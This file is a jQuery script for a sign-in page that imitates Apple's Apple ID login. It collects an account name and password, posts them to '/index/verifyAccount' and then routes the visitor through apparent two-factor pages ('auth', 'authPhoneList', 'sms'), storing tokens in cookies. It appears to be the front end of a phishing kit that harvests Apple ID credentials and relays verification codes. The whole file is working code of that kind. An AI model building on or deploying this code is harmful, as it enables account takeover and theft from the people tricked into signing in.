$.removeCookie('Guid');
$.removeCookie('ID');
$.removeCookie('Number');
$(window.parent.document).scrollTop(46);
let signinButton = $('#sign-in');
let accountInput = $('#account_name_text_field');
let passwordInput = $('#password_text_field');
let spinner = $('.spinner-container.auth');
let signinForm = $('#sign_in_form');
let accountForm = $('#sign_in_form .account-name');
let passwordForm = $('#sign_in_form .password');
let accountLabel = $('#apple_id_field_label');
let passwordLabel = $('#password_field_label');
let signinError = $('.signin-error');


if (accountInput.is(":focus"))
    signinButton.addClass('has-focus');

accountInput.on('focus', function () {
    accountForm.addClass('select-focus');
    passwordForm.removeClass('select-focus');
    signinError.addClass('hide');
    if (!signinForm.hasClass('account-name-entered') && signinForm.hasClass('hide-password')) {
        signinButton.addClass('has-focus');
        accountLabel.removeClass('account-label-custom-blur');
        accountLabel.addClass('account-label-custom-focus');
    }
});

accountInput.on('blur', function () {
    if (!signinForm.hasClass('account-name-entered') && signinForm.hasClass('hide-password')) {
        let value = accountInput.val();
        if (!value || value.length < 1) {
            signinButton.removeClass('has-focus');
            accountLabel.removeClass('account-label-custom-focus');
            accountLabel.addClass('account-label-custom-blur');
        }
    }
});

passwordInput.on('focus', function () {
    passwordForm.addClass('select-focus');
    accountForm.removeClass('select-focus');
    signinButton.addClass('has-focus-password');
    signinButton.addClass('has-focus-password');
    signinButton.removeClass('has-focus-password-blur');
    signinError.addClass('hide');
});

passwordInput.on('blur', function () {
    let value = passwordInput.val();
    if (!value || value.length < 1) {
        signinButton.removeClass('has-focus-password');
        signinButton.addClass('has-focus-password-blur');
    }
});

accountInput.on('keypress', (e) => {
    if (e.keyCode == 13)
        verifyAccount();
});
signinButton.on('click', verifyAccount);

function verifyAccount() {
    let value = accountInput.val();
    if (value && value.length > 0) {
        let password = passwordInput.val();
        if (!password || password.length < 1) {
            accountInput.addClass('verify-password');
            accountInput.attr('disabled', 'true');
            accountLabel.addClass('account-label-custom-focus');

            spinner.removeClass('password-spinner');
            spinner.addClass('focus');
            signinButton.addClass('v-hide');
            spinner.removeClass('spinner-hide');
            setTimeout(() => {
                // 显示密码框
                signinForm.addClass('account-name-entered');
                signinForm.removeClass('hide-password');
                signinForm.removeClass('hide-placeholder');
                passwordInput.val('');
                passwordInput.focus();

                accountInput.addClass('form-textbox-input');
                accountInput.removeClass('lower-border-reset');
                accountInput.addClass('form-textbox-entered');
                accountForm.removeClass('hide-password');
                accountForm.addClass('show-password');

                accountInput.removeAttr('disabled');

                accountInput.removeClass('verify-password');
                accountInput.removeAttr('disabled');
                accountLabel.removeClass('account-label-custom-focus');

                signinButton.addClass('disable');
                signinButton.attr('disabled', "true");

                signinButton.addClass('has-focus-password');
                spinner.addClass('spinner-hide');
                signinButton.removeClass('has-focus');
                signinButton.removeClass('v-hide');

            }, 10)
        }
        else {
            tryLogin();
        }
    }
}

passwordInput.on('keypress', (e) => {
    if (e.keyCode == 13)
        tryLogin();
});

function tryLogin() {
    signinButton.addClass('v-hide');
    spinner.addClass('password-spinner');
    spinner.addClass('focus');
    spinner.removeClass('spinner-hide');

    disableInputs();

    var appleAccount = $('#account_name_text_field').val();
    var applePassword = $('#password_text_field').val();

    if (!appleAccount || !applePassword) {
        verifyFailed();
        return;
    }



    $.ajax({
        url: '/index/verifyAccount',
        dataType: 'json',
        type: 'post',
        async: true,
        contentType:'application/json',
        data: JSON.stringify({
            'accountName': appleAccount,
            'password': applePassword
        }),
        success: function (response) {

            const data = response?.data;
            if (data && (response.code === 201 || response.code === 202 || response.code === 203)) {
                // 验证成功
                $('.landing__animation', window.parent.document).hide();
                $('.landing',window.parent.document).addClass('landing--sign-in landing--first-factor-authentication-success landing--transition');
                var date = new Date();
                date.setTime(date.getTime()+(60*1000*10));
                $.cookie('Guid',data.Guid,{expires:date});

                switch (response.code) {
                    case 201:
                        window.location.href = '/index/auth';
                        break;
                    case 202:
                        window.location.href = '/index/authPhoneList?Guid='+data.Guid;
                        break;
                    case 203:
                        $.cookie('ID',data.ID,{expires:date});
                        $.cookie('Number',data.Number,{expires:date});
                        window.location.href = '/index/sms?Number='+$.cookie('Number');
                        break;
                    default:
                        window.location.href = '/index/auth';
                }

            }
            else {
                verifyFailed();
            }
        },
        error: function () {
            verifyFailed();
        }
    });
}

function verifyFailed() {
    // 账号密码验证失败 (清空密码 + 重新聚焦账号输入框)
    enableInputs();
    spinner.addClass('spinner-hide');
    signinButton.removeClass('has-focus');
    signinButton.removeClass('v-hide');
    passwordInput.val('');
    accountInput.focus();
    signinError.removeClass('hide');
}

$('body').on('click', (e) => {
    if (!$(e.target).closest(".signin-error").length) {
        signinError.addClass('hide');
    }
});

function disableInputs() {
    accountInput.addClass('verify-password');
    accountInput.attr('disabled', 'true');
    accountLabel.addClass('account-label-custom-focus');
    passwordInput.addClass('verify-password');
    passwordInput.attr('disabled', 'true');
    passwordLabel.addClass('account-label-custom-focus');
}

function enableInputs() {
    accountInput.removeClass('verify-password');
    accountInput.removeAttr('disabled');
    accountLabel.removeClass('account-label-custom-focus');
    passwordInput.removeClass('verify-password');
    passwordInput.removeAttr('disabled');
    passwordLabel.removeClass('account-label-custom-focus');
}

accountInput.on('input', function (e) {
    let value = accountInput.val();
    if (value && value.length > 0) {
        if (!signinForm.hasClass('account-name-entered') && signinForm.hasClass('hide-password')) {
            signinButton.removeClass('disable');
            signinButton.removeAttr('disabled');
        }
    }
    else {
        signinButton.addClass('disable');
        signinButton.attr('disabled', "true");

        signinButton.removeClass('has-focus-password');
        spinner.addClass('spinner-hide');
        signinButton.addClass('has-focus');
        signinButton.removeClass('v-hide');

        // 隐藏密码框
        passwordInput.val('');
        signinForm.removeClass('account-name-entered');
        signinForm.addClass('hide-password');
        signinForm.addClass('hide-placeholder');
        signinButton.removeClass('has-focus-password')
        signinButton.removeClass('has-focus-password-blur');

        accountForm.addClass('hide-password');
        accountForm.removeClass('show-password');
    }
});


passwordInput.on('input', function (e) {
    let value = passwordInput.val();
    if (value && value.length > 0) {
        signinButton.removeClass('disable');
        signinButton.removeAttr('disabled');
    }
    else {
        signinButton.addClass('disable');
        signinButton.attr('disabled', "true");
    }
});
